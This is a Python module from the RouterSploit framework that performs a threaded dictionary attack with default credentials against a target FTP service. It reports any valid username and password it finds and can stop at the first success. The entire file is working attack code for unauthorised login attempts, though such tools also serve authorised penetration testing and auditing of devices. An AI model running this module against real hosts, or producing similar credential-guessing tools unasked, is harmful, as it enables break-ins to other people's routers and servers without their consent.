from routersploit.core.exploit import *
from routersploit.core.ftp.ftp_client import FTPClient
from routersploit.resources import wordlists


class Exploit(FTPClient):
    __info__ = {
        "name": "FTP Default Creds",
        "description": "Module performs dictionary attack with default credentials against FTP service."
                       "If valid credentials are found, the are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Multiple devices",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")

    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(wordlists.defaults, "User:Pass pair or file with default credentials (file://)")

    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting attack against FTP service")

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                username, password = data.next().split(":", 1)
            except StopIteration:
                break
            else:
                ftp_client = self.ftp_create()
                if ftp_client.connect(retries=3) is None:
                    print_error("Too many connections problems. Quiting...", verbose=self.verbosity)
                    return

            if ftp_client.login(username, password):
                if self.stop_on_success:
                    running.clear()

                self.credentials.append((self.target, self.port, self.target_protocol, username, password))

        ftp_client.close()

    def check(self):
        ftp_client = self.ftp_create()
        if ftp_client.test_connect():
            print_status("Target exposes FTP service", verbose=self.verbosity)
            return True

        print_status("Target does not expose FTP service", verbose=self.verbosity)
        return False

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []

            data = LockedIterator(self.defaults)
            self.run_threads(self.threads, self.target_function, data)

            if self.credentials:
                return self.credentials

        return None
